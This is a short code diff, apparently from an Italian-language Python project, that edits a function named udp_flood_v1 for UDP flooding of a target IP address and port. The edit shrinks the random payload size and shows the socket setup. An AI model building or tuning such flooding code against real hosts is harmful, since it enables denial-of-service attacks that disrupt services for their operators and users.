@@ -13,7 +13,7 @@ import random
 
 def udp_flood_v1(indirizzo_ip, numero_porta, numero_pacchetti):
     """ Creazione di un udp flood """
-    data_to_send = random._urandom(4096)
+    data_to_send = random._urandom(1024)
     try:
         my_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     except ConnectionError as error:
